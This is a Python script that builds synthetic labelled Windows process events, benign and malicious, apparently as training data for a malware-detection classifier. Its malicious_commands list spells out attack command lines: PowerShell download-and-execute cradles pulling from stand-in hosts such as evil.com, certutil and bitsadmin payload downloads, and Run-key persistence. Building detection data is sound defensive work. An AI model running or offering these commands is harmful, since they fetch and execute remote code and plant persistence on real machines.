import pandas as pd
import numpy as np
from pathlib import Path
from datetime import datetime, timedelta
import random


def generate_sample_data(num_benign: int = 1000, num_malicious: int = 200, output_path: str = "data/processed/sample_data.csv"):
    """Generate sample training data for testing."""
    
    # Benign processes and commands
    benign_processes = [
        "explorer.exe", "chrome.exe", "firefox.exe", "notepad.exe",
        "winword.exe", "excel.exe", "powershell.exe", "cmd.exe"
    ]
    
    benign_commands = [
        "powershell -Command Get-Process",
        "cmd /c dir",
        "powershell -Command Get-ChildItem",
        "cmd /c echo Hello",
        "powershell -Command Get-Date",
        "cmd /c type file.txt",
        "powershell -Command Get-Service",
        "cmd /c ping google.com"
    ]
    
    # Malicious patterns
    malicious_commands = [
        "powershell -EncodedCommand <base64>",
        "powershell -e <base64>",
        "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
        "cmd /c certutil -urlcache -split -f http://malicious.com/file.exe",
        "powershell -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
        "wmic process call create \"powershell.exe -enc <base64>\"",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"powershell.exe -e <base64>\"",
        "bitsadmin /transfer job http://malicious.com/payload.exe C:\\temp\\payload.exe"
    ]
    
    events = []
    
    # Generate benign events
    base_time = datetime.now() - timedelta(days=7)
    
    for i in range(num_benign):
        process = random.choice(benign_processes)
        command = random.choice(benign_commands)
        
        events.append({
            'event_id': '1',
            'timestamp': (base_time + timedelta(seconds=i*60)).isoformat(),
            'process_name': process,
            'command_line': command,
            'parent_image': 'explorer.exe' if random.random() > 0.5 else 'svchost.exe',
            'user': f'DOMAIN\\user{random.randint(1, 10)}',
            'integrity_level': random.choice(['Medium', 'High']),
            'label': 0
        })
    
    # Generate malicious events
    malicious_processes = ['powershell.exe', 'cmd.exe', 'wmic.exe', 'certutil.exe', 'mshta.exe']
    
    for i in range(num_malicious):
        process = random.choice(malicious_processes)
        command = random.choice(malicious_commands)
        
        events.append({
            'event_id': '1',
            'timestamp': (base_time + timedelta(days=random.randint(1, 7), seconds=random.randint(0, 86400))).isoformat(),
            'process_name': process,
            'command_line': command,
            'parent_image': random.choice(['explorer.exe', 'powershell.exe', 'cmd.exe']),
            'user': f'DOMAIN\\user{random.randint(1, 10)}',
            'integrity_level': random.choice(['Medium', 'High', 'System']),
            'label': 1
        })
    
    # Shuffle events
    random.shuffle(events)
    
    # Save to CSV
    df = pd.DataFrame(events)
    output_path_obj = Path(output_path)
    output_path_obj.parent.mkdir(parents=True, exist_ok=True)
    df.to_csv(output_path, index=False)
    
    print(f"Generated {len(events)} events ({num_benign} benign, {num_malicious} malicious)")
    print(f"Saved to {output_path}")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Generate sample training data')
    parser.add_argument('--benign', type=int, default=1000, help='Number of benign events')
    parser.add_argument('--malicious', type=int, default=200, help='Number of malicious events')
    parser.add_argument('--output', type=str, default='data/processed/sample_data.csv', help='Output path')
    
    args = parser.parse_args()
    
    generate_sample_data(args.benign, args.malicious, args.output)




